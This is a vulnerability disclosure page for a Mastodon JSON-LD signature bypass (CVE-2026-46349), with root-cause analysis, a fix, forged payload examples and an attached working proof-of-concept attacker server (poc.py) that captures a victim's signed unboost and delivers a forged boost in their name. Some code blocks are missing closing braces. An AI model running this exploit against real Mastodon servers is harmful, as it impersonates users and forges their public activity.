<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-P2DWB2SK -->

# ANT-2026-P2DWB2SK · mastodon/mastodon

## signature-bypass high

[CVE-2026-46349](https://nvd.nist.gov/vuln/detail/CVE-2026-46349)
[GHSA-chgx-jx3p-rf73](https://github.com/advisories/GHSA-chgx-jx3p-rf73)

Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.

# ANT-2026-P2DWB2SK: LD-Signature bypass via JSON-LD named-graph restructuring

`ActivityPub::LinkedDataSignature#verify_actor!` verifies signatures over the **RDF canonicalization** of a JSON-LD document, but Mastodon then **dispatches** on the raw JSON tree shape. These two views diverge for documents containing named `@graph` blocks, because `JsonLdHelper#canonicalize` pipes quads through `RDF::Graph.new`, which silently strips graph names.

An attacker who observes *any* LD-signed activity with an embedded object — the canonical example being `Undo{Announce}` (an unboost) — can restructure the JSON to hoist the inner object (`Announce`) to the top level while pushing the outer wrapper (`Undo`) into a named `@graph`. The signature bytes are **reused unchanged**; the RDF triple set is identical; `verify_actor!` returns the victim; and `ProcessCollectionService` dispatches an `Announce` in the victim's name.

**Demonstrated impact:** Convert a victim's `Undo{Announce}` (unboost) into an `Announce` (boost) attributed to the victim, persisted to the database and federated as a public status. The same technique applies to `Undo{Follow}`, `Undo{Like}`, `Undo{Block}`, `Reject{Follow}` → `Follow`, etc. — any activity with a structurally complete embedded sub-activity.

**Project:** mastodon/mastodon
**Commit:** `73c43f476878aad1`
**Location:** `app/lib/activitypub/linked_data_signature.rb:28`

JsonLdHelper#canonicalize does `RDF::Graph.new << JSON::LD::API.toRdf(json)`; RDF::Graph represents a single unnamed graph and drops the graph\_name component of incoming quads, so a document with the Undo moved into a named @graph yields exactly the same URDNA2015 N-Quads output and SHA-256 document\_hash as the original. The signature therefore covers the RDF triple set, not the JSON tree shape that Activity.factory actually dispatches on, and embedding vs. IRI-referencing a node produces the same triple, letting the attacker freely rearrange the tree.

This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-P2DWB2SK.

---

**Reference:** ANT-2026-P2DWB2SK

Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.

# Vulnerability Report

## Vulnerability Header

| Field | Value |
| --- | --- |
| **Vulnerability Title** | LD-Signature Bypass via JSON-LD Named-Graph Restructuring |
| **Severity Rating** | High |
| **Bug Category** | Improper Verification of Cryptographic Signature (CWE-347) |
| **Location** | `app/helpers/json_ld_helper.rb:102–105`, `app/lib/activitypub/linked_data_signature.rb:28` |
| **Affected Versions** | All current versions |

## Executive Summary

`ActivityPub::LinkedDataSignature#verify_actor!` verifies signatures over the URDNA2015 RDF canonicalization of incoming JSON-LD documents, but `ActivityPub::ProcessCollectionService` dispatches on the document's raw JSON tree shape. These two views diverge for documents containing named `@graph` blocks: `JsonLdHelper#canonicalize` processes quads through `RDF::Graph.new`, which silently discards graph names, causing two structurally different JSON-LD documents encoding the same RDF triple set to produce identical URDNA2015 output and therefore the same signature hash.

An unauthenticated attacker who receives any LD-signed `Undo{Announce}` (an unboost) from a victim — obtained passively by following them from any federated server — can hoist the embedded `Announce` to the top level of the JSON and push the outer `Undo` into a named `@graph` block. The original signature bytes are reused unchanged, RSA verification passes, and `ProcessCollectionService` dispatches an `Announce` in the victim's name, creating a persistent public boost attributed to the victim on any target Mastodon instance. No cryptographic capability, no account on the target server, and no interaction from the victim during the attack are required. The `compact()` defense introduced for CVE-2022-24307 is orthogonal and does not mitigate this attack: `@graph` is a JSON-LD keyword, not a context-mapped term, and is preserved by compaction.

Note on CVSS: the formal vector is `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` (5.3 Medium) because the attacker's choice of boost target is constrained to what the victim previously signed (they cannot inject arbitrary content). The HIGH rating above reflects the architectural severity: this is a complete bypass of a cryptographic authentication primitive, requiring only JSON rearrangement, exploitable against any Mastodon instance in the victim's federation graph, with persistent and publicly visible consequences.

## Root Cause Analysis

### Technical Description

`LinkedDataSignature#verify_actor!` computes the document hash by calling `hash(@json.without('signature'))`, which in turn calls `canonicalize(obj)`:

```
# app/helpers/json_ld_helper.rb:102-105
def canonicalize(json)
  graph = RDF::Graph.new << JSON::LD::API.toRdf(json, documentLoader: method(:load_jsonld_context))
  graph.dump(:normalize)
end
```

`JSON::LD::API.toRdf` converts JSON-LD to an enumerable of `RDF::Statement` objects. When the input document contains a named graph — a node with both `@id` and `@graph` — the resulting statements are **quads**: they carry a `graph_name` component. `RDF::Graph` represents exactly one unnamed graph. When a quad is inserted via `<<`, the `graph_name` is silently discarded and the statement is stored as a plain triple in the default graph. This is documented `RDF::Graph` semantics, not a bug in the gem — but it is the wrong container for signature verification, which must operate over named-graph-aware datasets.

The consequence is that two JSON-LD documents with **different tree shapes** but the **same underlying RDF triple set** produce byte-identical URDNA2015 output and therefore the same `document_hash`. By hoisting the embedded `Announce` from a captured `Undo{Announce}` to the top level and pushing the `Undo` into a named `@graph`, an attacker preserves every RDF triple exactly — the signature passes — while changing what the JSON dispatcher reads.

The `compact()` call added for CVE-2022-24307 does not mitigate this. That fix defended against `@context` manipulation by re-compacting against Mastodon's own trusted context. Here, `@graph` is a JSON-LD **keyword** — immune to context remapping, preserved by `JSON::LD::API.compact`. The forged document's top-level `type: "Announce"` survives compaction intact.

The divergence between signature verification and dispatch is visible in the code path:

```
# app/lib/activitypub/linked_data_signature.rb
def verify_actor!
  # ...
  document_hash  = hash(@json.without('signature'))          # hashes RDF canonicalization
  to_be_verified = options_hash + document_hash
  creator if creator.keypair.public_key.verify(              # passes: same triples
    OpenSSL::Digest.new('SHA256'), Base64.decode64(signature), to_be_verified)
end

# app/services/activitypub/process_collection_service.rb
def call(body, actor, **options)
  # ...
  @json = compact(@json) if @json['signature'].is_a?(Hash)   # @graph survives compaction
  # ...
  verify_account!                                             # returns victim ✓
  # ...
end

def process_item(item)
  activity = ActivityPub::Activity.factory(item, @account, **@options)  # reads item['type'] = 'Announce'
  activity&.perform                                                       # Status.create!(account: victim, ...)
end
```

### Attack Walkthrough

**1. Attacker observes a legitimate signed activity**

When a victim unboosts a post, Mastodon emits a signed `Undo{Announce}` with `always_sign: true` (unconditional, in `app/services/remove_status_service.rb:106`) and broadcasts it to all followers. The attacker, following the victim from any federated server, receives:

```
  "@context": ["https://www.w3.org/ns/activitystreams", "https://w3id.org/security/v1"],
  "id": "https://victim.example/users/alice#announces/123/undo",
  "type": "Undo",
  "actor": "https://victim.example/users/alice",
  "to": ["https://www.w3.org/ns/activitystreams#Public"],
  "object": {
    "id": "https://victim.example/users/alice/statuses/123/activity",
    "type": "Announce",
    "actor": "https://victim.example/users/alice",
    "published": "2026-03-30T07:18:30Z",
    "to": ["https://www.w3.org/ns/activitystreams#Public"],
    "cc": ["https://victim.example/users/alice/followers"],
    "object": "https://target.example/users/bob/statuses/456"
  },
  "signature": {
    "type": "RsaSignature2017",
    "creator": "https://victim.example/users/alice#main-key",
    "created": "2026-03-30T07:18:30Z",
    "signatureValue": "pyT13uUodTRbUJZa..."
```

**2. Attacker restructures — zero crypto required**

The attacker hoists the inner `Announce` to the top level and pushes the `Undo` into a named `@graph`, referencing the `Announce` by IRI (which produces the same `<undo> as:object <announce>` RDF triple as embedding it):

```
  "@context": ["https://www.w3.org/ns/activitystreams", "https://w3id.org/security/v1"],
  "id": "https://victim.example/users/alice/statuses/123/activity",
  "type": "Announce",
  "actor": "https://victim.example/users/alice",
  "published": "2026-03-30T07:18:30Z",
  "to": ["https://www.w3.org/ns/activitystreams#Public"],
  "cc": ["https://victim.example/users/alice/followers"],
  "object": "https://target.example/users/bob/statuses/456",
  "@graph": [{
    "id": "https://victim.example/users/alice#announces/123/undo",
    "type": "Undo",
    "actor": "https://victim.example/users/alice",
    "to": ["https://www.w3.org/ns/activitystreams#Public"],
    "object": "https://victim.example/users/alice/statuses/123/activity"
  }],
  "signature": { "...": "IDENTICAL BYTES" }
```

Every RDF triple from the original document is present. The `Undo` triples become quads when parsed (with `graph_name = <announce-id>`), then `RDF::Graph` discards the graph name, producing the same triple set. URDNA2015 output is byte-identical; the hash matches; RSA verification passes.

**3. Attacker delivers to the target inbox**

The attacker POSTs the forged payload to `POST /target.example/inbox`, signing the HTTP request with their own key. The target Mastodon instance:

1. Verifies the HTTP signature — passes (attacker's own valid key)
2. Detects `actor ≠ HTTP signer` → falls through to LD-signature verification
3. LD signature verifies — hash collision, same RDF triples
4. `verify_actor!` returns the victim's account
5. `Activity.factory` reads top-level `type: "Announce"` → `ActivityPub::Activity::Announce#perform`
6. `Status.create!(account: victim, reblog: target_status, visibility: :public)`

**4. Outcome**

A persistent, public boost attributed to the victim appears on the target server and is federated onward to the victim's followers there. The victim's original unboost is rendered permanently ineffective on that instance.

## Exploitability Assessment

### Attack Vector & Reachability

| Attack vector | Network |
| --- | --- |
| **Authentication required** | None — the attacker needs no account on the target server |
| **User interaction required** | None — the victim's routine use of the platform (unboosting) passively generates the ammunition; no victim action is required during or to trigger the attack |
| **Reachable in default config** | Yes — Mastodon emits LD-signed `Undo{Announce}` with `always_sign: true` unconditionally, regardless of `authorized_fetch_mode` |
| **Entry point** | `POST /inbox` — the standard ActivityPub inbox endpoint, internet-reachable by design as part of federation |

The attacker can create a fraudulent boost attributed to the victim on any Mastodon instance that accepts the activity (see the follower/content relationship constraints below). The forged status is permanent (persisted to PostgreSQL), public (`visibility: public`), and federated onward to the victim's followers on the target server. The attack is repeatable — once per captured `Undo{Announce}` — and can be delivered to multiple target instances. The boosted content is fixed by the original signature: the attacker can cause the victim to *appear to have re-boosted* whatever they had previously unboosted, but cannot make the victim boost unrelated content.

**Acceptance condition on the target server:** `ActivityPub::Activity::Announce#related_to_local_activity?` must return `true`. This holds when:
- The boosted post is hosted on the target server (`reblog_of_local_status?`) — no follower relationship required, and the easiest test case; **or**
- At least one local account on the target server follows the victim (`followed_by_local_accounts?`)

**Scope note:** Only `Undo{Announce}` is directly exploitable from Mastodon-generated payloads because it is the only Undo variant serialized with `always_sign: true`. Other Undo types (`Undo{Follow}`, `Undo{Like}`, `Undo{Block}`) would require LD-signed activities from other ActivityPub implementations that sign those payloads.

### Reproduction Steps

**Environment**

| Component | Requirement |
| --- | --- |
| Attacker server | Internet-reachable server with a public domain and valid TLS certificate |
| Victim account | Any Mastodon account on a server **different from the target** |
| Target server | Any Mastodon instance (the instance where the forged boost is delivered) |

> **Critical:** The victim account must be *remote* from the target server. If the victim is a local account on the target, the activity is processed via a different code path and the forgery fails.

The simplest test setup: the boosted post belongs to the target server (`reblog_of_local_status?` returns `true`), eliminating the need for a local account on the target to follow the victim.

**HTTPS setup for the attacker server**

`poc.py` listens on a plain HTTP port (default: 8080). Mastodon requires HTTPS with a valid TLS certificate for all federation traffic, so the attacker server needs a reverse proxy in front of it. The easiest option is [Caddy](https://caddyserver.com/), which handles TLS automatically via Let's Encrypt:

```
# Install Caddy (Debian/Ubuntu)
sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
sudo apt update && sudo apt install caddy

# Start a reverse proxy — Caddy automatically obtains a TLS cert for your domain
# (port 80/443 must be open and the domain must resolve to this server's IP)
caddy reverse-proxy --from attacker.example.com --to localhost:8080
```

Alternatively, if Caddy is already installed, add this to your `Caddyfile` and run `caddy reload`:

```
attacker.example.com {
    reverse_proxy localhost:8080
```

**Steps**

```
# 1. Install dependencies and start the HTTPS reverse proxy (see above)
pip install -r requirements.txt

# 2. Establish federation: follow the victim (run once)
python3 poc.py \
    --domain  attacker.example.com \
    --victim  https://victim-server.example.com/users/victim \
    --inbox   https://target-server.example.com/inbox \
    --follow

# 3. On the victim account: boost any public post hosted on the target server,
#    then unboost it. poc.py automatically receives the Undo{Announce},
#    restructures it, and delivers the forged Announce to the target inbox.

# 4. Visit the victim's profile from the target server and verify that
#    the target post appears still boosted. On the other hand, the post should NOT
#    appear when visiting the victim's profile on the victim's home server.
```

**Expected output**

```
[*] Listening on port 8080 — waiting for Undo{Announce}...

[+] Inbox: Undo from https://victim-server.example.com/users/victim
[!] Signed Undo{Announce} — restructuring payload and firing

[>] Delivering forged Announce to https://target-server.example.com/inbox
    actor  : https://victim-server.example.com/users/victim
    object : https://target-server.example.com/users/.../statuses/...
    sig    : https://victim-server.example.com/users/victim#main-key (reused, unmodified)
[<] 202 Accepted
[+] Accepted — check the target server's database for a forged boost
```

**PoC files**

* `poc.py` — minimal ActivityPub server; follows the victim, listens for the signed `Undo{Announce}`, restructures the payload, and delivers the forged `Announce` to the target inbox automatically. Run on the attacker-controlled HTTPS server.

## Recommended Fix

**Option 1 — Reject `@graph` before LD-signature verification (recommended)**

In `app/lib/activitypub/linked_data_signature.rb#verify_actor!`, add after the existing `return unless @json['signature'].is_a?(Hash)` guard:

```
# Named-graph and inclusion keywords allow structural forgery: different JSON tree,
# same RDF triples. Mastodon never emits @graph or @included in signed activities;
# their presence is a near-certain forgery indicator.
return if @json.key?('@graph') || @json.key?('@included')
```

This has zero false-positive risk (confirmed: `grep -r '@graph' app/serializers/` returns no hits — Mastodon's own serializers never emit these keywords) and zero interop risk (no mainstream ActivityPub implementation uses `@graph` for single-activity delivery). Including `@included` covers a related restructuring possible with JSON-LD 1.1.

**Option 2 — Defense-in-depth: also reject at `process_collection_service.rb`**

In `app/services/activitypub/process_collection_service.rb`, after the `compact()` call on line 15:

```
# If @graph survived compaction, the LD signature is structurally untrustworthy.
return if @json.key?('@graph') || @json.key?('@included')
```

**Not recommended: replacing `RDF::Graph` with `RDF::Repository`**

`RDF::Repository` preserves quad graph names and would be the architecturally correct fix, but would change the document hash for every signed document ever emitted by any Mastodon instance, breaking signature verification across the federation until all servers upgrade simultaneously.

## References

* CVE-2022-24307 — prior JSON-LD signature bypass in Mastodon via `@context` manipulation (orthogonal mechanism; the `compact()` fix for that issue does not mitigate this attack)
* CWE-347: Improper Verification of Cryptographic Signature
* [JSON-LD 1.0 §3.4 — Named Graphs](https://www.w3.org/TR/json-ld/#named-graphs)
* [Anthropic CVD Policy](https://anthropic.com/security/cvd-policy)

## Attribution

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by **Savio** at **Doyensec** in collaboration with Anthropic Research.

For CVE credits and public acknowledgments: **Doyensec in collaboration with Claude and Anthropic Research**

## Attachment: `poc.py`

```
#!/usr/bin/env python3
"""
Minimal ActivityPub attacker server — ANT-2026-04915 LD-sig bypass PoC

Vulnerability: LD-Signature bypass via JSON-LD named-graph restructuring
Affected:      app/lib/activitypub/linked_data_signature.rb
               app/helpers/json_ld_helper.rb

Root cause: JsonLdHelper#canonicalize uses RDF::Graph (single unnamed graph),
which silently discards graph_name from quads. Two JSON-LD documents with
different tree shapes but the same underlying triple set produce identical
URDNA2015 output and therefore the same document_hash. An attacker can hoist
an embedded Announce from a captured Undo{Announce} to the top level while
pushing the Undo into a named @graph — the signature verifies unchanged, but
ProcessCollectionService dispatches on the top-level 'type' = 'Announce'.

Three servers are involved:
  - Attacker server: where this script runs (must be HTTPS-reachable)
  - Victim server:   home server of the victim account
  - Target server:   Mastodon instance where the forged boost is delivered
                     (must be DIFFERENT from the victim server — local accounts
                      are not processed via the federated inbox code path)

Usage:
  pip install flask requests cryptography

  # Step 1 — follow the victim (run once; establishes federation)
  python3 poc.py \\
      --domain  attacker.example.com \\
      --victim  https://victim-server.example.com/users/victim \\
      --inbox   https://target-server.example.com/inbox \\
      --follow

  # Step 2 — listen for the Undo{Announce} (run continuously)
  python3 poc.py \\
      --domain  attacker.example.com \\
      --victim  https://victim-server.example.com/users/victim \\
      --inbox   https://target-server.example.com/inbox

  Then log into the victim account and boost any public post hosted on the
  target server, then unboost it. The forged Announce is restructured and
  delivered to the target inbox automatically.

  The attacker server must be reachable over HTTPS from both the victim server
  and the target server. Run it behind a reverse proxy (e.g. Caddy:
  reverse_proxy localhost:8080) on a valid domain with a valid TLS certificate.

  Simplest test setup: use a post on the TARGET server as the boost target.
  This means reblog_of_local_status? is true on the target, so no local account
  on the target needs to follow the victim.

Note on keypair persistence: the keypair is saved to attacker_key.pem on first
run and reloaded on subsequent restarts. Delete attacker_key.pem to rotate keys
(then refresh the target's cached actor: tootctl accounts refresh attacker@...).
"""

import argparse
import base64
import hashlib
import json
import os
import threading
import time
from email.utils import formatdate

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from flask import Flask, Response, jsonify, request

app = Flask(__name__)

# Filled in from CLI args at startup
DOMAIN         = None
ACTOR_URI      = None
KEY_ID         = None
VICTIM_URI     = None
TARGET_INBOX   = None
private_key    = None
public_key_pem = None

AS_CONTEXT = [
    "https://www.w3.org/ns/activitystreams",
    "https://w3id.org/security/v1",
]

# ── Crypto helpers ─────────────────────────────────────────────────────────────

KEY_FILE = "attacker_key.pem"

def generate_keypair():
    global private_key, public_key_pem
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            private_key = serialization.load_pem_private_key(f.read(), password=None)
        print(f"[*] Loaded keypair from {KEY_FILE}")
    else:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        with open(KEY_FILE, "wb") as f:
            f.write(private_key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))
        print(f"[*] Generated new keypair, saved to {KEY_FILE}")
    public_key_pem = private_key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()

def http_sign(method, url, body_bytes=b""):
    """
    Build HTTP Signature headers for an outgoing ActivityPub request.
    Uses draft-cavage-06 with headers: (request-target) host date digest
    """
    from urllib.parse import urlparse
    parsed = urlparse(url)
    date   = formatdate(usegmt=True)
    digest = "SHA-256=" + base64.b64encode(hashlib.sha256(body_bytes).digest()).decode()

    signing_string = "\n".join([
        f"(request-target): {method.lower()} {parsed.path}",
        f"host: {parsed.netloc}",
        f"date: {date}",
        f"digest: {digest}",
    ])

    sig = base64.b64encode(
        private_key.sign(signing_string.encode(), padding.PKCS1v15(), hashes.SHA256())
    ).decode()

    return {
        "Host":         parsed.netloc,
        "Date":         date,
        "Digest":       digest,
        "Content-Type": "application/activity+json",
        "Signature": (
            f'keyId="{KEY_ID}",'
            f'algorithm="rsa-sha256",'
            f'headers="(request-target) host date digest",'
            f'signature="{sig}"'
        ),

# ── Attack logic ───────────────────────────────────────────────────────────────

def restructure(original):
    """
    Restructure a signed Undo{Announce} into a forged Announce.

    Original layout (what the victim signed):
      { type: Undo, object: { type: Announce, object: <status-uri> } }

    Forged layout (what ProcessCollectionService will dispatch):
      { type: Announce, object: <status-uri>, @graph: [{ type: Undo, ... }] }

    Why the signature still verifies:
      - JSON::LD::API.toRdf emits the @graph node's statements as quads
        with graph_name = <announce-id>.
      - RDF::Graph.new strips graph_name on insert (it represents one unnamed
        graph), so the quad becomes an ordinary triple.
      - The resulting triple set is identical to the original document's.
      - URDNA2015 output is byte-identical → SHA-256 hash matches → RSA verifies.

    Why the dispatcher reads Announce:
      - compact() preserves @graph (JSON-LD keyword, not a context-mapped term).
      - ProcessCollectionService reads compacted['type'] = 'Announce'.
      - Activity.factory dispatches ActivityPub::Activity::Announce#perform.
    """
    inner = original["object"]  # the embedded Announce dict

    return {
        "@context":  original["@context"],
        # ── hoisted from inner Announce ──────────────────────────────────────
        "id":        inner["id"],
        "type":      inner["type"],         # "Announce"
        "actor":     inner["actor"],
        "published": inner.get("published"),
        "to":        inner.get("to", []),
        "cc":        inner.get("cc", []),
        "object":    inner["object"],       # IRI string — same as:object triple
        # ── Undo pushed into named @graph ────────────────────────────────────
        # graph_name will be stripped by RDF::Graph, preserving all triples
        "@graph": [{
            "id":    original["id"],
            "type":  original["type"],      # "Undo"
            "actor": original["actor"],
            "to":    original.get("to", []),
            "object": inner["id"],          # IRI ref → same <undo> as:object <announce> triple
        }],
        # ── unchanged — no crypto required ───────────────────────────────────
        "signature": original["signature"],

def deliver(forged):
    """POST the forged Announce to the target server's inbox."""
    body = json.dumps(forged).encode()
    hdrs = http_sign("POST", TARGET_INBOX, body)
    print("\n[*] Delivering forged activity to target inbox in 10 seconds...")
    time.sleep(10)  # wait to ensure the original Undo{Announce} is fully processed first
    print(f"\n[>] Delivering forged {forged['type']} to {TARGET_INBOX}")
    print(f"    actor  : {forged['actor']}")
    print(f"    object : {forged['object']}")
    print(f"    sig    : {forged['signature']['creator']} (reused, unmodified)")

    resp = requests.post(TARGET_INBOX, data=body, headers=hdrs, timeout=15, verify=True)
    print(f"[<] {resp.status_code} {resp.reason}")

    if resp.status_code == 202:
        print("[+] Accepted — check the target server for a forged boost")
    else:
        print(f"[!] Unexpected response: {resp.text[:200]}")

# ── ActivityPub endpoints ──────────────────────────────────────────────────────

def ap_json(data):
    return Response(json.dumps(data), content_type="application/activity+json")

@app.get("/.well-known/webfinger")
def webfinger():
    return jsonify({
        "subject": f"acct:attacker@{DOMAIN}",
        "links": [{
            "rel":  "self",
            "type": "application/activity+json",
            "href": ACTOR_URI,
        }],
    })

@app.get("/users/attacker")
def actor():
    return ap_json({
        "@context":          AS_CONTEXT,
        "id":                ACTOR_URI,
        "type":              "Person",
        "preferredUsername": "attacker",
        "inbox":             f"https://{DOMAIN}/users/attacker/inbox",
        "outbox":            f"https://{DOMAIN}/users/attacker/outbox",
        "followers":         f"https://{DOMAIN}/users/attacker/followers",
        "following":         f"https://{DOMAIN}/users/attacker/following",
        "publicKey": {
            "id":           KEY_ID,
            "owner":        ACTOR_URI,
            "publicKeyPem": public_key_pem,
        },
    })

@app.post("/users/attacker/inbox")
@app.post("/inbox")
def inbox():
    try:
        activity = json.loads(request.get_data())
    except Exception:
        return "", 400

    atype = activity.get("type", "?")
    actor = activity.get("actor", "?")
    print(f"[+] Inbox: {atype} from {actor}")

    # Ammunition detected: signed Undo wrapping an Announce
    if (
        atype == "Undo"
        and isinstance(activity.get("signature"), dict)
        and isinstance(activity.get("object"), dict)
        and activity["object"].get("type") == "Announce"
    ):
        print("[!] Signed Undo{Announce} — restructuring payload and firing")
        forged = restructure(activity)
        # Deliver in a background thread so we return 202 promptly
        threading.Thread(target=deliver, args=(forged,), daemon=True).start()

    # Accept everything else silently (Accept{Follow}, Undo{Follow}, etc.)
    return "", 202

@app.get("/users/attacker/outbox")
@app.get("/users/attacker/followers")
@app.get("/users/attacker/following")
def empty_collection():
    return ap_json({
        "@context":    "https://www.w3.org/ns/activitystreams",
        "type":        "OrderedCollection",
        "totalItems":  0,
        "orderedItems": [],
    })

# ── Follow helper ──────────────────────────────────────────────────────────────

def send_follow():
    """
    Fetch the victim's actor to resolve their inbox, then POST a Follow activity.
    Victim Server will respond with Accept{Follow} delivered to our inbox (handled above).
    """
    print(f"[*] Fetching victim actor: {VICTIM_URI}")
    actor_data   = requests.get(
        VICTIM_URI,
        headers={"Accept": "application/activity+json"},
        timeout=10,
    ).json()
    victim_inbox = actor_data["inbox"]

    follow = {
        "@context": "https://www.w3.org/ns/activitystreams",
        "id":       f"https://{DOMAIN}/activities/follow-1",
        "type":     "Follow",
        "actor":    ACTOR_URI,
        "object":   VICTIM_URI,
    body = json.dumps(follow).encode()
    hdrs = http_sign("POST", victim_inbox, body)

    print(f"[>] Follow → {victim_inbox}")
    resp = requests.post(victim_inbox, data=body, headers=hdrs, timeout=10)
    print(f"[<] {resp.status_code} {resp.reason}")

# ── Entrypoint ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="ANT-2026-04915 PoC — LD-signature bypass via @graph restructuring"
    )
    parser.add_argument(
        "--domain", required=True,
        help="Public domain of this server (e.g. attacker.example.com)"
    )
    parser.add_argument(
        "--victim", required=True,
        help="Victim actor URI (e.g. https://victim-server.example.com/@victim)"
    )
    parser.add_argument(
        "--inbox", required=True,
        help="Target inbox URI (e.g. https://target-server.example.com/inbox)"
    )
    parser.add_argument(
        "--port", type=int, default=8080,
        help="Local port to listen on (default: 8080)"
    )
    parser.add_argument(
        "--follow", action="store_true",
        help="Send a Follow activity to the victim on startup"
    )
    args = parser.parse_args()

    DOMAIN       = args.domain
    ACTOR_URI    = f"https://{DOMAIN}/users/attacker"
    KEY_ID       = f"https://{DOMAIN}/users/attacker#main-key"
    VICTIM_URI   = args.victim
    TARGET_INBOX = args.inbox

    generate_keypair()
    print(f"[*] Actor  : {ACTOR_URI}")
    print(f"[*] Key ID : {KEY_ID}")

    # Start Flask in a background thread before sending the Follow so that
    # when server verifies the HTTP signature it can reach our actor endpoint.
    flask_thread = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=args.port),
        daemon=True,
    )
    flask_thread.start()
    print(f"[*] Listening on port {args.port} — waiting for Undo{{Announce}}...\n")

    if args.follow:
        time.sleep(2)  # give Flask a moment to bind
        send_follow()

    flask_thread.join()
```

## Attachment: `requirements.txt`

```
cryptography
flask
requests
```

ADVISORY

<https://github.com/mastodon/mastodon/security/advisories/GHSA-chgx-jx3p-rf73>

1. 2026-03-30
2. 2026-04-23
3. 2026-05-07
4. 2026-05-15
5. 2026-05-20

9b255d47046f22115964a5d2188f12d17def4a057f3320d558190a6ebfc554768f29aa76160aba8d0099888ce3dd07f03159591d6d091dad304e1ab223f2a950

Committed 2026-04-23 07:04 UTC

Revealed 2026-05-20 18:00 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-P2DWB2SK%22%2C%22bug_class%22%3A%22Signature-bypass%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%2273c43f476878aad1%22%2C%22created_at%22%3A%222026-03-30T23%3A19%3A44%2B00%3A00%22%2C%22description%22%3A%22%60ActivityPub%3A%3ALinkedDataSignature%23verify_actor%21%60%20verifies%20signatures%20over%20the%20%2A%2ARDF%20canonicalization%2A%2A%20of%20a%20JSON-LD%20document%2C%20but%20Mastodon%20then%20%2A%2Adispatches%2A%2A%20on%20the%20raw%20JSON%20tree%20shape.%20These%20two%20views%20diverge%20for%20documents%20containing%20named%20%60%40graph%60%20blocks%2C%20because%20%60JsonLdHelper%23canonicalize%60%20pipes%20quads%20through%20%60RDF%3A%3AGraph.new%60%2C%20which%20silently%20strips%20graph%20names.%5Cn%5CnAn%20attacker%20who%20observes%20%2Aany%2A%20LD-signed%20activity%20with%20an%20embedded%20object%20%E2%80%94%20the%20canonical%20example%20being%20%60Undo%7BAnnounce%7D%60%20%28an%20unboost%29%20%E2%80%94%20can%20restructure%20the%20JSON%20to%20hoist%20the%20inner%20object%20%28%60Announce%60%29%20to%20the%20top%20level%20while%20pushing%20the%20outer%20wrapper%20%28%60Undo%60%29%20into%20a%20named%20%60%40graph%60.%20The%20signature%20bytes%20are%20%2A%2Areused%20unchanged%2A%2A%3B%20the%20RDF%20triple%20set%20is%20identical%3B%20%60verify_actor%21%60%20returns%20the%20victim%3B%20and%20%60ProcessCollectionService%60%20dispatches%20an%20%60Announce%60%20in%20the%20victim%27s%20name.%5Cn%5Cn%2A%2ADemonstrated%20impact%3A%2A%2A%20Convert%20a%20victim%27s%20%60Undo%7BAnnounce%7D%60%20%28unboost%29%20into%20an%20%60Announce%60%20%28boost%29%20attributed%20to%20the%20victim%2C%20persisted%20to%20the%20database%20and%20federated%20as%20a%20public%20status.%20The%20same%20technique%20applies%20to%20%60Undo%7BFollow%7D%60%2C%20%60Undo%7BLike%7D%60%2C%20%60Undo%7BBlock%7D%60%2C%20%60Reject%7BFollow%7D%60%20%E2%86%92%20%60Follow%60%2C%20etc.%20%E2%80%94%20any%20activity%20with%20a%20structurally%20complete%20embedded%20sub-activity.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22app/lib/activitypub/linked_data_signature.rb%3A28%22%2C%22poc_sha256%22%3A%221ea154b5316d90a56209dab12e77121690df7629e6cc2814ba93544646847901%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22mastodon%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22JsonLdHelper%23canonicalize%20does%20%60RDF%3A%3AGraph.new%20%3C%3C%20JSON%3A%3ALD%3A%3AAPI.toRdf%28json%29%60%3B%20RDF%3A%3AGraph%20represents%20a%20single%20unnamed%20graph%20and%20drops%20the%20graph_name%20component%20of%20incoming%20quads%2C%20so%20a%20document%20with%20the%20Undo%20moved%20into%20a%20named%20%40graph%20yields%20exactly%20the%20same%20URDNA2015%20N-Quads%20output%20and%20SHA-256%20document_hash%20as%20the%20original.%20The%20signature%20therefore%20covers%20the%20RDF%20triple%20set%2C%20not%20the%20JSON%20tree%20shape%20that%20Activity.factory%20actually%20dispatches%20on%2C%20and%20embedding%20vs.%20IRI-referencing%20a%20node%20produces%20the%20same%20triple%2C%20letting%20the%20attacker%20freely%20rearrange%20the%20tree.%22%2C%22title%22%3A%22LD-Signature%20bypass%20via%20JSON-LD%20named-graph%20restructuring%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-P2DWB2SK",
  "bug_class": "Signature-bypass",
  "commit_sha": "73c43f476878aad1",
  "created_at": "2026-03-30T23:19:44+00:00",
